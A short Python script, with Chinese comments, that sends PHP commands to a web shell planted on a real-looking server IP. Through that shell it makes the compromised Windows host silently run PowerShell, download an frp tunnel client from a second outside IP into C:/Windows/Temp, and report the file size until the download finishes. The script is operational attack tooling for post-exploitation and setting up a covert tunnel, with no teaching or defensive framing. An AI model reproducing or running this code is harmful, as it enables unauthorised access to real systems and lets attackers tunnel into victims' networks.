#!/usr/bin/env python3
"""后台下载 frpc.exe: start /b powershell 后台拉取, 轮询文件大小"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=40):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

# 后台下载: cmd start /b powershell Invoke-WebRequest (异步, PHP立即返回)
# 用单引号避免转义问题
dl = "system('start /b powershell -NoProfile -Command \"Invoke-WebRequest -Uri http://165.99.43.145:9124/frp_serve.exe -OutFile C:/Windows/Temp/frpc.exe\"');print_r('BG_STARTED');"
print("1. 启动后台下载...", flush=True)
r = cmd(dl, 30)
print("   ", r.strip()[-60:], flush=True)

# 轮询文件大小 (每5秒, 最多60秒)
for i in range(12):
    time.sleep(5)
    r = cmd("print_r(filesize('C:/Windows/Temp/frpc.exe'));", 20)
    sz = r.strip().split()[-1] if r.strip() else "?"
    print(f"   第{i+1}次: {sz} 字节", flush=True)
    try:
        if int(sz) > 10000000:
            print("   下载完成!", flush=True)
            break
    except:
        pass
